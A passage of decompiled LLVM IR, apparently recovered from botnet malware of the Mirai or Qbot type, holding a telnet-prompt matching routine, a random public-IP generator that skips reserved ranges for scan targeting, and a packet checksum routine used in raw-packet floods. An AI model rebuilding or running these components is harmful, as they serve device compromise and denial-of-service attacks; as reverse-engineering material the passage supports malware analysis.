  %v5_8049959 = icmp slt i32 %v1_8049953, %arg7
  br i1 %v5_8049959, label %dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge, label %dec_label_pc_8049989

dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge: ; preds = %dec_label_pc_8049950.backedge
  %v3_804995b.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_804995b

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498f4
  br label %dec_label_pc_8049993

dec_label_pc_804991d:                             ; preds = %dec_label_pc_80498b3
  %v3_8049926 = call i32 @strstr(i32 %v5_804987d, i8* %v2_8049926)
  %v1_804992e = icmp eq i32 %v3_8049926, 0
  %v1_8049930 = icmp eq i1 %v1_804992e, false
  br i1 %v1_8049930, label %dec_label_pc_804997d, label %dec_label_pc_8049932

dec_label_pc_8049932:                             ; preds = %dec_label_pc_804991d
  br i1 %v4_8049932, label %dec_label_pc_8049950.backedge, label %dec_label_pc_8049938

dec_label_pc_8049938:                             ; preds = %dec_label_pc_8049932
  %v3_804993b = call i32 @matchPrompt(i8* %arg6)
  %v1_8049943 = icmp eq i32 %v3_804993b, 0
  br i1 %v1_8049943, label %dec_label_pc_8049950.backedge, label %dec_label_pc_804997d

dec_label_pc_804995b:                             ; preds = %dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge, %dec_label_pc_804995b.lr.ph
  %v3_804995b = phi i32 [ %arg4, %dec_label_pc_804995b.lr.ph ], [ %v3_804995b.pre, %dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_804995b.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge ]
  %tmp36 = icmp slt i32 %v3_804995b, 1
  %tmp37 = icmp eq i1 %tmp36, false
  br i1 %tmp37, label %dec_label_pc_8049821, label %dec_label_pc_8049969

dec_label_pc_8049969:                             ; preds = %dec_label_pc_804995b
  br i1 %tmp39, label %dec_label_pc_8049821, label %dec_label_pc_8049989

dec_label_pc_804997d:                             ; preds = %dec_label_pc_8049938, %dec_label_pc_804991d
  br label %dec_label_pc_8049993

dec_label_pc_8049989:                             ; preds = %dec_label_pc_8049950.backedge, %dec_label_pc_8049969, %dec_label_pc_8049821, %entry
  br label %dec_label_pc_8049993

dec_label_pc_8049993:                             ; preds = %dec_label_pc_804997d, %dec_label_pc_8049911, %dec_label_pc_80498e5, %dec_label_pc_80498a4, %dec_label_pc_8049989
  %v3_8049993 = phi i32 [ 1, %dec_label_pc_804997d ], [ 0, %dec_label_pc_8049911 ], [ 0, %dec_label_pc_80498e5 ], [ 0, %dec_label_pc_80498a4 ], [ 0, %dec_label_pc_8049989 ]
  ret i32 %v3_8049993

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_80498ce, { 0, 2, 1 }
  uselistorder i32 %v5_804988d, { 0, 2, 1 }
  uselistorder i32 %v5_804987d, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049993, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049989, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049950.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80499a1 = load i32, i32* @edi, align 4
  %v0_80499a3 = load i32, i32* @ebx, align 4
  store i32 %v0_80499a3, i32* %stack_var_-16, align 4
  %v3_80499a7 = call i32 @random()
  %v2_80499b7 = ashr i32 %v3_80499a7, 31
  %v2_80499ba = zext i32 %v3_80499a7 to i64
  %v4_80499ba = zext i32 %v2_80499b7 to i64
  %v5_80499ba = mul nuw i64 %v4_80499ba, 4294967296
  %v6_80499ba = or i64 %v5_80499ba, %v2_80499ba
  %v10_80499ba = srem i64 %v6_80499ba, 223
  %v11_80499ba = trunc i64 %v10_80499ba to i32
  store i32 %v11_80499ba, i32* @eax, align 4
  %v1_80499be = trunc i64 %v10_80499ba to i8
  store i8 %v1_80499be, i8* @global_var_805a17b.36, align 1
  %v0_80499c3 = call i32 @random()
  %v2_80499d3 = ashr i32 %v0_80499c3, 31
  %v2_80499d6 = zext i32 %v0_80499c3 to i64
  %v4_80499d6 = zext i32 %v2_80499d3 to i64
  %v5_80499d6 = mul nuw i64 %v4_80499d6, 4294967296
  %v6_80499d6 = or i64 %v5_80499d6, %v2_80499d6
  %v10_80499d6 = srem i64 %v6_80499d6, 255
  %v11_80499d6 = trunc i64 %v10_80499d6 to i32
  store i32 %v11_80499d6, i32* @eax, align 4
  %v1_80499da = trunc i64 %v10_80499d6 to i8
  store i8 %v1_80499da, i8* @global_var_805a17c.37, align 4
  %v0_80499df = call i32 @random()
  %v2_80499ef = ashr i32 %v0_80499df, 31
  %v2_80499f2 = zext i32 %v0_80499df to i64
  %v4_80499f2 = zext i32 %v2_80499ef to i64
  %v5_80499f2 = mul nuw i64 %v4_80499f2, 4294967296
  %v6_80499f2 = or i64 %v5_80499f2, %v2_80499f2
  %v10_80499f2 = srem i64 %v6_80499f2, 255
  %v11_80499f2 = trunc i64 %v10_80499f2 to i32
  store i32 %v11_80499f2, i32* @eax, align 4
  %v1_80499f6 = trunc i64 %v10_80499f2 to i8
  store i8 %v1_80499f6, i8* @global_var_805a17d.38, align 1
  %v0_80499fb = call i32 @random()
  %v2_8049a0b = ashr i32 %v0_80499fb, 31
  %v2_8049a0e = zext i32 %v0_80499fb to i64
  %v4_8049a0e = zext i32 %v2_8049a0b to i64
  %v5_8049a0e = mul nuw i64 %v4_8049a0e, 4294967296
  %v6_8049a0e = or i64 %v5_8049a0e, %v2_8049a0e
  br label %dec_label_pc_8049a89

dec_label_pc_8049a19:                             ; preds = %dec_label_pc_8049c12, %dec_label_pc_8049c05, %dec_label_pc_8049bf8, %dec_label_pc_8049beb, %dec_label_pc_8049bde, %dec_label_pc_8049bd1, %dec_label_pc_8049bc4, %dec_label_pc_8049bb7, %dec_label_pc_8049baa, %dec_label_pc_8049b9d, %dec_label_pc_8049b90, %dec_label_pc_8049b83, %dec_label_pc_8049b76, %dec_label_pc_8049b69, %dec_label_pc_8049b5c, %dec_label_pc_8049b3d, %dec_label_pc_8049b27, %dec_label_pc_8049b08, %dec_label_pc_8049ae9, %dec_label_pc_8049ad3, %dec_label_pc_8049ac6, %dec_label_pc_8049ab9, %dec_label_pc_8049aac, %dec_label_pc_8049a9f, %dec_label_pc_8049a92, %dec_label_pc_8049a89
  %v0_8049a19 = call i32 @random()
  %v2_8049a29 = ashr i32 %v0_8049a19, 31
  %v2_8049a2c = zext i32 %v0_8049a19 to i64
  %v4_8049a2c = zext i32 %v2_8049a29 to i64
  %v5_8049a2c = mul nuw i64 %v4_8049a2c, 4294967296
  %v6_8049a2c = or i64 %v5_8049a2c, %v2_8049a2c
  %v10_8049a2c = srem i64 %v6_8049a2c, 223
  %v11_8049a2c = trunc i64 %v10_8049a2c to i32
  store i32 %v11_8049a2c, i32* @eax, align 4
  %v1_8049a30 = trunc i64 %v10_8049a2c to i8
  store i8 %v1_8049a30, i8* @global_var_805a17b.36, align 1
  %v0_8049a35 = call i32 @random()
  %v2_8049a45 = ashr i32 %v0_8049a35, 31
  %v2_8049a48 = zext i32 %v0_8049a35 to i64
  %v4_8049a48 = zext i32 %v2_8049a45 to i64
  %v5_8049a48 = mul nuw i64 %v4_8049a48, 4294967296
  %v6_8049a48 = or i64 %v5_8049a48, %v2_8049a48
  %v10_8049a48 = srem i64 %v6_8049a48, 255
  %v11_8049a48 = trunc i64 %v10_8049a48 to i32
  store i32 %v11_8049a48, i32* @eax, align 4
  %v1_8049a4c = trunc i64 %v10_8049a48 to i8
  store i8 %v1_8049a4c, i8* @global_var_805a17c.37, align 4
  %v0_8049a51 = call i32 @random()
  %v2_8049a61 = ashr i32 %v0_8049a51, 31
  %v2_8049a64 = zext i32 %v0_8049a51 to i64
  %v4_8049a64 = zext i32 %v2_8049a61 to i64
  %v5_8049a64 = mul nuw i64 %v4_8049a64, 4294967296
  %v6_8049a64 = or i64 %v5_8049a64, %v2_8049a64
  %v10_8049a64 = srem i64 %v6_8049a64, 255
  %v11_8049a64 = trunc i64 %v10_8049a64 to i32
  store i32 %v11_8049a64, i32* @eax, align 4
  %v1_8049a68 = trunc i64 %v10_8049a64 to i8
  store i8 %v1_8049a68, i8* @global_var_805a17d.38, align 1
  %v0_8049a6d = call i32 @random()
  %v2_8049a7d = ashr i32 %v0_8049a6d, 31
  %v2_8049a80 = zext i32 %v0_8049a6d to i64
  %v4_8049a80 = zext i32 %v2_8049a7d to i64
  %v5_8049a80 = mul nuw i64 %v4_8049a80, 4294967296
  %v6_8049a80 = or i64 %v5_8049a80, %v2_8049a80
  br label %dec_label_pc_8049a89

dec_label_pc_8049a89:                             ; preds = %entry, %dec_label_pc_8049a19
  %v6_8049a0e.sink = phi i64 [ %v6_8049a0e, %entry ], [ %v6_8049a80, %dec_label_pc_8049a19 ]
  %v10_8049a0e = srem i64 %v6_8049a0e.sink, 255
  %extract.t = trunc i64 %v10_8049a0e to i8
  %extract.t8 = trunc i64 %v10_8049a0e to i32
  store i8 %extract.t, i8* @global_var_805a17e.39, align 2
  %v0_8049a89 = load i8, i8* @global_var_805a17b.36, align 1
  %v1_8049a89 = zext i8 %v0_8049a89 to i32
  %v3_8049a89 = and i32 %extract.t8, -256
  %v4_8049a89 = or i32 %v1_8049a89, %v3_8049a89
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049a8e = icmp eq i8 %v0_8049a89, 127
  br i1 %v10_8049a8e, label %dec_label_pc_8049a19, label %dec_label_pc_8049a92

dec_label_pc_8049a92:                             ; preds = %dec_label_pc_8049a89
  store i32 %v4_8049a89, i32* @eax, align 4
  %v4_8049a97 = icmp eq i8 %v0_8049a89, 0
  br i1 %v4_8049a97, label %dec_label_pc_8049a19, label %dec_label_pc_8049a9f

dec_label_pc_8049a9f:                             ; preds = %dec_label_pc_8049a92
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049aa4 = icmp eq i8 %v0_8049a89, 3
  br i1 %v10_8049aa4, label %dec_label_pc_8049a19, label %dec_label_pc_8049aac

dec_label_pc_8049aac:                             ; preds = %dec_label_pc_8049a9f
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049ab1 = icmp eq i8 %v0_8049a89, 15
  br i1 %v10_8049ab1, label %dec_label_pc_8049a19, label %dec_label_pc_8049ab9

dec_label_pc_8049ab9:                             ; preds = %dec_label_pc_8049aac
  store i32 %v4_8049a89, i32* @eax, align 4
  %v7_8049abe = icmp eq i8 %v0_8049a89, 16
  br i1 %v7_8049abe, label %dec_label_pc_8049a19, label %dec_label_pc_8049ac6

dec_label_pc_8049ac6:                             ; preds = %dec_label_pc_8049ab9
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049acb = icmp eq i8 %v0_8049a89, 56
  br i1 %v10_8049acb, label %dec_label_pc_8049a19, label %dec_label_pc_8049ad3

dec_label_pc_8049ad3:                             ; preds = %dec_label_pc_8049ac6
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049ad8 = icmp eq i8 %v0_8049a89, 10
  br i1 %v10_8049ad8, label %dec_label_pc_8049a19, label %dec_label_pc_8049ae0

dec_label_pc_8049ae0:                             ; preds = %dec_label_pc_8049ad3
  %v8_8049ae5 = icmp eq i8 %v0_8049a89, -64
  %v1_8049ae7 = icmp eq i1 %v8_8049ae5, false
  br i1 %v1_8049ae7, label %dec_label_pc_8049af6, label %dec_label_pc_8049ae9

dec_label_pc_8049ae9:                             ; preds = %dec_label_pc_8049ae0
  %v0_8049ae9 = load i8, i8* @global_var_805a17c.37, align 4
  %v1_8049ae9 = zext i8 %v0_8049ae9 to i32
  %v4_8049ae9 = or i32 %v1_8049ae9, %v3_8049a89
  store i32 %v4_8049ae9, i32* @eax, align 4
  %v11_8049aee = icmp eq i8 %v0_8049ae9, -88
  br i1 %v11_8049aee, label %dec_label_pc_8049a19, label %dec_label_pc_8049af6

dec_label_pc_8049af6:                             ; preds = %dec_label_pc_8049ae9, %dec_label_pc_8049ae0
  %v2_8049af6 = phi i32 [ %v4_8049ae9, %dec_label_pc_8049ae9 ], [ %v4_8049a89, %dec_label_pc_8049ae0 ]
  %v3_8049af6 = and i32 %v2_8049af6, -256
  %v4_8049af6 = or i32 %v3_8049af6, %v1_8049a89
  %v11_8049afb = icmp eq i8 %v0_8049a89, -84
  %v1_8049afd = icmp eq i1 %v11_8049afb, false
  br i1 %v1_8049afd, label %dec_label_pc_8049b15, label %dec_label_pc_8049aff

dec_label_pc_8049aff:                             ; preds = %dec_label_pc_8049af6
  %v0_8049aff = load i8, i8* @global_var_805a17c.37, align 4
  %v1_8049aff = zext i8 %v0_8049aff to i32
  %v4_8049aff = or i32 %v1_8049aff, %v3_8049af6
  %tmp32 = icmp ult i8 %v0_8049aff, 16
  br i1 %tmp32, label %dec_label_pc_8049b15, label %dec_label_pc_8049b08

dec_label_pc_8049b08:                             ; preds = %dec_label_pc_8049aff
  store i32 %v4_8049aff, i32* @eax, align 4
  %tmp33 = icmp ult i8 %v0_8049aff, 32
  br i1 %tmp33, label %dec_label_pc_8049a19, label %dec_label_pc_8049b15

dec_label_pc_8049b15:                             ; preds = %dec_label_pc_8049b08, %dec_label_pc_8049aff, %dec_label_pc_8049af6
  %v2_8049b15 = phi i32 [ %v4_8049aff, %dec_label_pc_8049b08 ], [ %v4_8049aff, %dec_label_pc_8049aff ], [ %v4_8049af6, %dec_label_pc_8049af6 ]
  %v3_8049b15 = and i32 %v2_8049b15, -256
  %v4_8049b15 = or i32 %v3_8049b15, %v1_8049a89
  %v10_8049b1a = icmp eq i8 %v0_8049a89, 100
  %v1_8049b1c = icmp eq i1 %v10_8049b1a, false
  br i1 %v1_8049b1c, label %dec_label_pc_8049b34, label %dec_label_pc_8049b1e

dec_label_pc_8049b1e:                             ; preds = %dec_label_pc_8049b15
  %v0_8049b1e = load i8, i8* @global_var_805a17c.37, align 4
  %v1_8049b1e = zext i8 %v0_8049b1e to i32
  %v4_8049b1e = or i32 %v1_8049b1e, %v3_8049b15
  %tmp34 = icmp ult i8 %v0_8049b1e, 64
  br i1 %tmp34, label %dec_label_pc_8049b34, label %dec_label_pc_8049b27

dec_label_pc_8049b27:                             ; preds = %dec_label_pc_8049b1e
  store i32 %v4_8049b1e, i32* @eax, align 4
  %tmp35 = icmp ult i8 %v0_8049b1e, 127
  br i1 %tmp35, label %dec_label_pc_8049a19, label %dec_label_pc_8049b34

dec_label_pc_8049b34:                             ; preds = %dec_label_pc_8049b27, %dec_label_pc_8049b1e, %dec_label_pc_8049b15
  %v2_8049b34 = phi i32 [ %v4_8049b1e, %dec_label_pc_8049b27 ], [ %v4_8049b1e, %dec_label_pc_8049b1e ], [ %v4_8049b15, %dec_label_pc_8049b15 ]
  %v3_8049b34 = and i32 %v2_8049b34, -256
  %v4_8049b34 = or i32 %v3_8049b34, %v1_8049a89
  %v11_8049b39 = icmp eq i8 %v0_8049a89, -87
  %v1_8049b3b = icmp eq i1 %v11_8049b39, false
  br i1 %v1_8049b3b, label %dec_label_pc_8049b4a, label %dec_label_pc_8049b3d

dec_label_pc_8049b3d:                             ; preds = %dec_label_pc_8049b34
  %v0_8049b3d = load i8, i8* @global_var_805a17c.37, align 4
  %v1_8049b3d = zext i8 %v0_8049b3d to i32
  %v4_8049b3d = or i32 %v1_8049b3d, %v3_8049b34
  store i32 %v4_8049b3d, i32* @eax, align 4
  %v11_8049b42 = icmp eq i8 %v0_8049b3d, -1
  br i1 %v11_8049b42, label %dec_label_pc_8049a19, label %dec_label_pc_8049b4a

dec_label_pc_8049b4a:                             ; preds = %dec_label_pc_8049b3d, %dec_label_pc_8049b34
  %v2_8049b4a = phi i32 [ %v4_8049b3d, %dec_label_pc_8049b3d ], [ %v4_8049b34, %dec_label_pc_8049b34 ]
  %v3_8049b4a = and i32 %v2_8049b4a, -256
  %v4_8049b4a = or i32 %v3_8049b4a, %v1_8049a89
  %v11_8049b4f = icmp eq i8 %v0_8049a89, -58
  %v1_8049b51 = icmp eq i1 %v11_8049b4f, false
  br i1 %v1_8049b51, label %dec_label_pc_8049b69, label %dec_label_pc_8049b53

dec_label_pc_8049b53:                             ; preds = %dec_label_pc_8049b4a
  %v0_8049b53 = load i8, i8* @global_var_805a17c.37, align 4
  %v1_8049b53 = zext i8 %v0_8049b53 to i32
  %v4_8049b53 = or i32 %v1_8049b53, %v3_8049b4a
  %tmp36 = icmp ult i8 %v0_8049b53, 18
  br i1 %tmp36, label %dec_label_pc_8049b69, label %dec_label_pc_8049b5c

dec_label_pc_8049b5c:                             ; preds = %dec_label_pc_8049b53
  store i32 %v4_8049b53, i32* @eax, align 4
  %tmp37 = or i8 %v0_8049b53, 1
  %tmp38 = icmp eq i8 %tmp37, 19
  br i1 %tmp38, label %dec_label_pc_8049a19, label %dec_label_pc_8049b69

dec_label_pc_8049b69:                             ; preds = %dec_label_pc_8049b5c, %dec_label_pc_8049b53, %dec_label_pc_8049b4a
  %v2_8049b69 = phi i32 [ %v4_8049b53, %dec_label_pc_8049b5c ], [ %v4_8049b53, %dec_label_pc_8049b53 ], [ %v4_8049b4a, %dec_label_pc_8049b4a ]
  %v3_8049b69 = and i32 %v2_8049b69, -256
  %v4_8049b69 = or i32 %v3_8049b69, %v1_8049a89
  store i32 %v4_8049b69, i32* @eax, align 4
  %v8_8049b6e = icmp eq i8 %v0_8049a89, -32
  br i1 %v8_8049b6e, label %dec_label_pc_8049a19, label %dec_label_pc_8049b76

dec_label_pc_8049b76:                             ; preds = %dec_label_pc_8049b69
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049b7b = icmp eq i8 %v0_8049a89, 6
  br i1 %v10_8049b7b, label %dec_label_pc_8049a19, label %dec_label_pc_8049b83

dec_label_pc_8049b83:                             ; preds = %dec_label_pc_8049b76
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049b88 = icmp eq i8 %v0_8049a89, 7
  br i1 %v10_8049b88, label %dec_label_pc_8049a19, label %dec_label_pc_8049b90

dec_label_pc_8049b90:                             ; preds = %dec_label_pc_8049b83
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049b95 = icmp eq i8 %v0_8049a89, 11
  br i1 %v10_8049b95, label %dec_label_pc_8049a19, label %dec_label_pc_8049b9d

dec_label_pc_8049b9d:                             ; preds = %dec_label_pc_8049b90
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049ba2 = icmp eq i8 %v0_8049a89, 21
  br i1 %v10_8049ba2, label %dec_label_pc_8049a19, label %dec_label_pc_8049baa

dec_label_pc_8049baa:                             ; preds = %dec_label_pc_8049b9d
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049baf = icmp eq i8 %v0_8049a89, 22
  br i1 %v10_8049baf, label %dec_label_pc_8049a19, label %dec_label_pc_8049bb7

dec_label_pc_8049bb7:                             ; preds = %dec_label_pc_8049baa
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bbc = icmp eq i8 %v0_8049a89, 26
  br i1 %v10_8049bbc, label %dec_label_pc_8049a19, label %dec_label_pc_8049bc4

dec_label_pc_8049bc4:                             ; preds = %dec_label_pc_8049bb7
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bc9 = icmp eq i8 %v0_8049a89, 28
  br i1 %v10_8049bc9, label %dec_label_pc_8049a19, label %dec_label_pc_8049bd1

dec_label_pc_8049bd1:                             ; preds = %dec_label_pc_8049bc4
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bd6 = icmp eq i8 %v0_8049a89, 29
  br i1 %v10_8049bd6, label %dec_label_pc_8049a19, label %dec_label_pc_8049bde

dec_label_pc_8049bde:                             ; preds = %dec_label_pc_8049bd1
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049be3 = icmp eq i8 %v0_8049a89, 30
  br i1 %v10_8049be3, label %dec_label_pc_8049a19, label %dec_label_pc_8049beb

dec_label_pc_8049beb:                             ; preds = %dec_label_pc_8049bde
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bf0 = icmp eq i8 %v0_8049a89, 33
  br i1 %v10_8049bf0, label %dec_label_pc_8049a19, label %dec_label_pc_8049bf8

dec_label_pc_8049bf8:                             ; preds = %dec_label_pc_8049beb
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bfd = icmp eq i8 %v0_8049a89, 55
  br i1 %v10_8049bfd, label %dec_label_pc_8049a19, label %dec_label_pc_8049c05

dec_label_pc_8049c05:                             ; preds = %dec_label_pc_8049bf8
  store i32 %v4_8049b69, i32* @eax, align 4
  %v11_8049c0a = icmp eq i8 %v0_8049a89, -42
  br i1 %v11_8049c0a, label %dec_label_pc_8049a19, label %dec_label_pc_8049c12

dec_label_pc_8049c12:                             ; preds = %dec_label_pc_8049c05
  store i32 %v4_8049b69, i32* @eax, align 4
  %v11_8049c17 = icmp eq i8 %v0_8049a89, -41
  br i1 %v11_8049c17, label %dec_label_pc_8049a19, label %dec_label_pc_8049c1f

dec_label_pc_8049c1f:                             ; preds = %dec_label_pc_8049c12
  store i32 0, i32* %stack_var_-32, align 4
  %v1_8049c3b = urem i32 %extract.t8, 256
  store i32 %v1_8049c3b, i32* @edx, align 4
  %v0_8049c47 = load i8, i8* @global_var_805a17d.38, align 1
  %v1_8049c47 = zext i8 %v0_8049c47 to i32
  %v0_8049c53 = load i8, i8* @global_var_805a17c.37, align 4
  %v1_8049c53 = zext i8 %v0_8049c53 to i32
  store i32 %v1_8049c53, i32* @ebx, align 4
  %v2_8049c6e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8049c6e, i32* @edi, align 4
  %v7_8049c7a = call i32 @szprintf(i32 %v2_8049c6e, i32 ptrtoint ([12 x i8]* @global_var_805616c.40 to i32), i32 %v1_8049a89, i32 %v1_8049c53, i32 %v1_8049c47, i32 %v1_8049c3b)
  %v1_8049c89 = call i32 @inet_addr(i32 %v2_8049c6e)
  %v2_8049c94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8049c94, i32* @ebx, align 4
  store i32 %v0_80499a1, i32* @edi, align 4
  ret i32 %v1_8049c89

; uselistorder directives
  uselistorder i32 %v4_8049b53, { 2, 1, 0 }
  uselistorder i32 %v4_8049b1e, { 2, 1, 0 }
  uselistorder i32 %v4_8049aff, { 2, 1, 0 }
  uselistorder i8 %v0_8049a89, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i8* @global_var_805a17d.38, { 2, 1, 0 }
  uselistorder i8* @global_var_805a17c.37, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i64 255, { 2, 0, 1, 3, 4 }
  uselistorder i8* @global_var_805a17b.36, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049a89, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049c9f = load i32, i32* @global_var_80603e8.41, align 8
  %v1_8049ca8 = call i32 @ntohl(i32 %v0_8049c9f)
  %v5_8049cb0 = and i32 %v1_8049ca8, %arg1
  %v1_8049cb6 = call i32 @rand_cmwc(i32 %v5_8049cb0)
  %v1_8049cc0 = sub i32 -1, %arg1
  %v2_8049cc2 = and i32 %v1_8049cb6, %v1_8049cc0
  %v5_8049cc4 = xor i32 %v2_8049cc2, %v5_8049cb0
  ret i32 %v5_8049cc4
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049cce = load i32, i32* @ebx, align 4
  %v4_8049d0233 = add i32 %arg2, -1
  %v9_8049d0234 = sub i32 0, %arg2
  %v10_8049d0235 = and i32 %arg2, %v9_8049d0234
  %v11_8049d0236 = icmp slt i32 %v10_8049d0235, 0
  %v12_8049d0237 = icmp eq i32 %v4_8049d0233, 0
  %v13_8049d0238 = icmp slt i32 %v4_8049d0233, 0
  %v3_8049d0639 = icmp eq i1 %v13_8049d0238, %v11_8049d0236
  %v4_8049d0640 = icmp eq i1 %v12_8049d0237, false
  %v5_8049d0641 = and i1 %v4_8049d0640, %v3_8049d0639
  br i1 %v5_8049d0641, label %dec_label_pc_8049ce2.lr.ph, label %dec_label_pc_8049d08

dec_label_pc_8049ce2.lr.ph:                       ; preds = %entry
  %v4_8049ce5.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8049ce2

dec_label_pc_8049ce2:                             ; preds = %dec_label_pc_8049ce2.lr.ph, %dec_label_pc_8049ce2
  %v4_8049ce5 = phi i32 [ %v4_8049ce5.pre, %dec_label_pc_8049ce2.lr.ph ], [ %v6_8049ce5, %dec_label_pc_8049ce2 ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_8049ce2.lr.ph ], [ %v9_8049cf7, %dec_label_pc_8049ce2 ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_8049ce2.lr.ph ], [ %v4_8049cfe, %dec_label_pc_8049ce2 ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_8049ce2.lr.ph ], [ %v23_8049cfa, %dec_label_pc_8049ce2 ]
  %v3_8049cf442 = phi i32 [ 0, %dec_label_pc_8049ce2.lr.ph ], [ %v6_8049cf4, %dec_label_pc_8049ce2 ]
  %v4_8049ce2 = ptrtoint i16* %stack_var_4.043 to i32
  %v2_8049ce5 = load i16, i16* %stack_var_4.043, align 2
  %v3_8049ce5 = zext i16 %v2_8049ce5 to i32
  %v5_8049ce5 = and i32 %v4_8049ce5, -65536
  %v6_8049ce5 = or i32 %v5_8049ce5, %v3_8049ce5
  store i32 %v6_8049ce5, i32* @ecx, align 4
  %sext51 = mul i32 %v3_8049cf442, 65536
  %v4_8049cf4 = sdiv i32 %sext51, 65536
  %v6_8049cf4 = add nsw i32 %v3_8049ce5, %v4_8049cf4
  %v11_8049cf4 = icmp ult i32 %v6_8049cf4, %v4_8049cf4
  %v26_8049cf4 = trunc i32 %v6_8049cf4 to i16
  %v7_8049cf7 = zext i1 %v11_8049cf4 to i16
  %v9_8049cf7 = add i16 %v7_8049cf7, %stack_var_-24.045
  %v5_8049cfa = add i32 %v4_8049ce2, 2
  %v23_8049cfa = inttoptr i32 %v5_8049cfa to i16*
  %v4_8049cfe = add i32 %stack_var_8.044, -2
  %v4_8049d02 = add i32 %stack_var_8.044, -3
  %v9_8049d02 = sub i32 2, %stack_var_8.044
  %v10_8049d02 = and i32 %v4_8049cfe, %v9_8049d02
  %v11_8049d02 = icmp slt i32 %v10_8049d02, 0
  %v12_8049d02 = icmp eq i32 %v4_8049d02, 0
  %v13_8049d02 = icmp slt i32 %v4_8049d02, 0
  %v3_8049d06 = icmp eq i1 %v13_8049d02, %v11_8049d02
  %v4_8049d06 = icmp eq i1 %v12_8049d02, false
  %v5_8049d06 = and i1 %v4_8049d06, %v3_8049d06
  br i1 %v5_8049d06, label %dec_label_pc_8049ce2, label %dec_label_pc_8049d08

dec_label_pc_8049d08:                             ; preds = %dec_label_pc_8049ce2, %entry
  %v3_8049cf4.lcssa = phi i16 [ 0, %entry ], [ %v26_8049cf4, %dec_label_pc_8049ce2 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_8049cfa, %dec_label_pc_8049ce2 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_8049cfe, %dec_label_pc_8049ce2 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_8049cf7, %dec_label_pc_8049ce2 ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_8049d4c.preheader, label %dec_label_pc_8049d0e

dec_label_pc_8049d0e:                             ; preds = %dec_label_pc_8049d08
  %v1_8049d11 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_8049d11 = load i8, i8* %v1_8049d11, align 1
  %v3_8049d11 = zext i8 %v2_8049d11 to i32
  %v4_8049d11 = load i32, i32* @ecx, align 4
  %v5_8049d11 = and i32 %v4_8049d11, -256
  %v6_8049d11 = or i32 %v5_8049d11, %v3_8049d11
  store i32 %v6_8049d11, i32* @ecx, align 4
  %v4_8049d1f = sext i16 %v3_8049cf4.lcssa to i32
  %v6_8049d1f = add nsw i32 %v3_8049d11, %v4_8049d1f
  %v11_8049d1f = icmp ult i32 %v6_8049d1f, %v4_8049d1f
  %v26_8049d1f = trunc i32 %v6_8049d1f to i16
  %v7_8049d22 = zext i1 %v11_8049d1f to i16
  %v9_8049d22 = add i16 %v7_8049d22, %stack_var_-24.0.lcssa
  br label %dec_label_pc_8049d4c.preheader

dec_label_pc_8049d4c.preheader:                   ; preds = %dec_label_pc_8049d0e, %dec_label_pc_8049d08
  %v3_8049d31.ph = phi i16 [ %v3_8049cf4.lcssa, %dec_label_pc_8049d08 ], [ %v26_8049d1f, %dec_label_pc_8049d0e ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_8049d08 ], [ %v9_8049d22, %dec_label_pc_8049d0e ]
  %v4_8049d4c20 = sext i16 %v3_8049d31.ph to i32
  %v4_8049d4f21 = sext i16 %stack_var_-24.1.ph to i32
